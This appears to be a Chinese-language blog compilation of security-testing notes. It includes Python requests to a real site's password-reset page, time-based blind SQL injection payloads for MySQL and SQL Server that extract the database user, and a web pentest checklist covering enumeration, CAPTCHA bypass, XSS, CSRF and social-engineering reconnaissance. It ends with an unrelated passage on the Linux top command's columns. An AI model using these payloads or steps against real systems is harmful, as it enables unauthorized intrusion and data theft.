使用httplib时的设置方式

import httplib,urllib,urllib2;   
params = urllib.urlencode({ 'param':"55B2A1EDA8B09D13",
                            'js_sfl':2,
                            'codetxt':'532832'});       
headers = { "Host": "www.aokang.cn",
            "Content-Length": "81",
            "Content-Type": "application/x-www-form-urlencoded"};   
conn = httplib.HTTPConnection("localhost",8555);#在此步骤设置代理地址,可以在代理中看到请求,方便调试
conn.request(method="POST",url="http://www.aokang.cn/member/verify_repassword.aspx?action=edit HTTP/1.1",body=params,headers=headers);      
response = conn.getresponse();     
conn.close();

使用urllib2时的设置方式

import httplib,urllib,urllib2;   
params = urllib.urlencode({ 'param':"55B2A1EDA8B09D13",
                            'js_sfl':2,
                            'codetxt':'532832'});       
headers = { "Host": "www.aokang.cn",
            "Content-Length": "81",
            "Content-Type": "application/x-www-form-urlencoded"};       
opener = urllib2.build_opener( urllib2.ProxyHandler({'http':"localhost:8555"}) )#在这一步设置代理地址和端口,可以看到请求
urllib2.install_opener(opener)
sContent = urllib2.urlopen("http://www.aokang.cn/member/verify_repassword.aspx?action=edit HTTP/1.1")
req = urllib2.Request(url = "http://www.aokang.cn/member/verify_repassword.aspx?action=edit HTTP/1.1",data=params)

总结:
1.可以在burp的repeater模块看看哪些参数可以删哪些不可以删.

4.使用httplib.HTTPConnection的对象调用request的时候将参数传入body时会出现限定长度的情况,目前还没有解决

昨天找到个延时注入,sqlmap跑出来数据库类型,试了下sqlmap生成payload好使,就自己动手写一个脚本验证一下.
记录下实现过程:

实现逻辑

try:
    发送payload
    payload = "aaa';sleep(10)"
    conn = httplib.HTTPConnection(host,timeout = 5);
    conn.request(method="POST",url="目标",body=payload,headers=headers);
    conn.getresponse()
    conn.close()
expect:
    如果发现异常说明当前payload判断正确

MYSQL相关函数

在mysql中注入payload可能是这样的

aaa,;if(ascii(mid(lower(user()),1,1),sleep(8),0))=97

说明:
1.当前用户(user)小写(lower)第一个字母(mid)的ascii码(ascii)等于97时延时(sleep)8秒.
2.mid(p1,p2,p3) p1为字符串,p2为起始位置,p3长度
3.在python中可以使用ord(“s”)来对应小写字母s的ascii码

SQLSERVER相关函数

在sqlserver中payload可能是这样的

username=aa';if(ascii(substring(system_user,%d,1))=%d) begin WAITFOR DELAY '0:0:10' end--" % (i,ord(s))

说明:
1.当前用户(system_user)第i个字母(substring)的ascii码(ascii)等于小写字母s对应的ascii码(ord)时,延时(WAITFOR DELAY)10秒.
2.substring(p1,p2,p3) p1为字符串,p2为起始位置,p3长度,和mysql中的mid函数功能类似
3.ord是python内建函数,其他的函数是在目标数据库中执行的.

安全测试思路总结

发表于 2015-09-14   |  

学习安全测试也有一段时间了,零零散散的学习了一些X站姿势,也结合前一阵的测试过程,做一个测试思路的总结.

信息搜集:

1.可以先用Nmap扫扫端口情况,换一换不同扫描策略看看结果.
2.用lijiejie的subdomainbrute.py查查子域名.
3.用dirfuzz.py爆破目录.
4.AppScan探测url备用.
5.可以利用登录或者找回密码等页面爆破网站注册用户.
6.根据域名查看域名注册人信息,IP反查,搜集旁站信息…
7.试试域传送漏洞.

总之就是尽可能的搜集信息,上面是能想到的比较重要的几点.在搜集过程中记录觉得有用的信息,例如:后台管理地址,企业邮箱入口.思路再猥琐一点,也可以搜集客服,HR或者其他一些公司公开人员信息,用于反射型XSS,CSRF,社工等用途.

账户体系检测

1.观察是否存在可爆破的页面,能否突破验证码,IP检测(通过修改X-Forwarded-For)等限制.
2.注册过程中可能出现的漏洞:任意手机注册,短信轰炸,越权绑定存在账户等问题,都需要进行排查.
2.修改密码功能,详情参考密码找回漏洞总结

SQL注入检测

1.将AppScan探测到的url存为txt文件.
2.使用sqlmap -m 参数进行批量扫描.
3.选取可疑url进行手工测试,尝试不同绕过.

XSS检测

1.使用chrome的XSS检测插件进行检测:将检测目标和payload添加至指定位置.
2.选取一些大范围使用以及可能造成存储型XSS的参数进行验证.
3.查看\”>&/等字符的过滤情况.

CSRF检测

1.截获请求,观察其中有无类似防止csrf攻击的参数.
2.修改refer继续请求.
3.如果请求被正常返回,构造csrf攻击页面,通过点击访问进行验证.

越权漏洞检测

1.注册两个账号,分别用chrome和火狐登录.
2.通过替换参数检测越权,通常是 id,uid,username等参数.
3.如果有条件同时检测平行越权和垂直越权.

历史漏洞排查

1.如果产品曾经爆出历史漏洞,可单独列出此项.
2.根据历史漏洞进行排查,验证修复情况.

工具扫描结果

1.AppScan 目前只用过这个,针对扫描结果进行验证,给出分析建议.
2.通常是一些敏感信息泄露:电话,邮箱,内网IP等
3.使用HTTPS协议,密码不能自动补全,httponly限制js操作cookie.

测试总结

1.列举测试过程中发现的问题,并简述修复建议.
2.简要评估网站安全.

e USER 进程所有者的用户名
f GROUP 进程所有者的组名
g TTY 启动进程的终端名。不是从终端启动的进程则显示为 ?
h PR 优先级
i NI nice值。负值表示高优先级，正值表示低优先级
j P 最后使用的CPU，仅在多CPU环境 下有意义
k %CPU 上次更新到现在的CPU时间占用百分比
l TIME 进程使用的CPU时间总计，单位秒
m TIME+ 进程使用的CPU时间总计，单位1/100秒
n %MEM 进程使用的物理内存 百分比
o VIRT 进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES
p SWAP 进程使用的虚拟内存中，被换出的大小，单位kb。
q RES 进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA
r CODE 可执行代码占用的物理 内存大小，单位kb
s DATA 可执行代码以外的部分(数据 段+栈)占用的物理 内存大小，单位kb
t SHR 共享内存大小，单位kb
u nFLT 页面错误次数
v nDRT 最后一次写入到现在，被修改过的页面数。
w S 进程状态。D =不可中断的睡眠状态R =运行S =睡眠T =跟踪/停止Z =僵尸进程
x COMMAND 命令名/命令行
y WCHAN 若该进程在睡眠，则显示睡眠中的系统函数名
z Flags 任务标志，参考 sched.h

默认情况下仅显示比较重要的 PID、USER、PR、NI、VIRT、RES、SHR、S、%CPU、%MEM、TIME+、COMMAND 列。可以通过下面的快捷键来更改显示内容。
更改显示内容通过 f 键可以选择显示的内容。按 f 键之后会显示列的列表，按 a-z 即可显示或隐藏对应的列，最后按回车键确定。
按 o 键可以改变列的显示顺序。按小写的 a-z 可以将相应的列向右移动，而大写的 A-Z 可以将相应的列向左移动。最后按回车键确定。
按大写的 F 或 O 键，然后按 a-z 可以将进程按照相应的列进行排序。而大写的 R 键可以将当前的排序倒转。
